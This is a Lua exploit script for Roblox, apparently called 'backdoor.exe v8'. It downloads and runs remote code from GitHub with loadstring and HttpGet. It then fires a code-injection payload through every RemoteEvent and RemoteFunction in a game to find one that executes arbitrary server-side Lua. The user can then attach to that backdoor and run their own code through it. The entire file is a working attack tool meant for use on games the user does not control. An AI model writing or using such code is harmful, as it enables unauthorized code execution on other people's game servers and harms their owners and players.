local genv = getgenv()

if genv.backdoorexe then genv.backdoorexe.screenGui:Destroy() end

local screenGui, uiRequire = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/ui.lua"))()
local alertLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/alerts.lua"))()

local ui = uiRequire(screenGui.main)
local config = ui.config
local btns = ui.btns
local editor = ui.editor
local CurrentBackdoor = nil

genv.backdoorexe = {screenGui = screenGui, ui = ui}

local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local TITLE = "backdoor.exe - v8.0.0"

local ALPHABET = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','^','&','*','(',')','-','_','=','+','[',']','{','}','|',';',':',',','.','?','/','`','~'}

local function GenerateRandomString(length)
	local str = ""
	for i = 1, length do
		str = str .. ALPHABET[math.random(1, #ALPHABET)]
	end
	return str
end

local function runRemote(r, args)
	if r:IsA("RemoteEvent") then
		pcall(function() r:FireServer(args) end)
	elseif r:IsA("RemoteFunction") then
		pcall(function() r:InvokeServer(args) end)
	end
end

local function scanAndFireBackdoors()
	ui.title.Text = TITLE .. " [Scanning]"
	alertLib.Info(screenGui, TITLE, "Scan started.", 4)
	local remotes = {}
	for _, remote in ipairs(game:GetDescendants()) do
		if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not remote:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
			local code = GenerateRandomString(math.random(12,30))
			remotes[code] = remote
			local payload = [[
local StringValue = Instance.new("StringValue")
StringValue.Value = "]] .. code .. [["
StringValue.Name = "]] .. code .. [["
game:GetService("Debris"):AddItem(StringValue, 3)
StringValue.Parent = game:GetService("ReplicatedStorage")
]]
			runRemote(remote, payload)
			print("Fired remote: " .. remote:GetFullName())
		end
	end
	
	local BackdoorFound = false
	
	repeat
		for code, remote in pairs(remotes) do
			local foundItem = game:GetService("ReplicatedStorage"):FindFirstChild(code)
			if foundItem and foundItem:IsA("StringValue") and foundItem.Value == code then
				CurrentBackdoor = remote
				warn("Remote that executed the code: " .. remote:GetFullName())
				BackdoorFound = true
				break
			end
		end
		wait(0.1)
	until BackdoorFound
	ui.title.Text = TITLE .. " [Attached Backdoor]"
	alertLib.Info(screenGui, TITLE, "Attached Backdoor: " .. CurrentBackdoor:GetFullName(), 4)
end

local executing = false

local function execute(code, gateway, canDebug)
	executing = true
	ui.title.Text = TITLE .. " [Executing]"
	runRemote(CurrentBackdoor, code)
	task.wait(2)
	ui.title.Text = TITLE
	executing = false
end

btns.execBtn.MouseButton1Click:Connect(function()
	if executing then return end
	executing = true
	scanAndFireBackdoors()
	executing = false
end)

ui.title.Text = TITLE
alertLib.Success(screenGui, TITLE, "Backdoor scanner successfully loaded.")
alertLib.Info(screenGui, TITLE, "Home to toggle ui.", 4)
alertLib.Info(screenGui, TITLE, "Recontinued by ReactorCoreDev!!", 4)
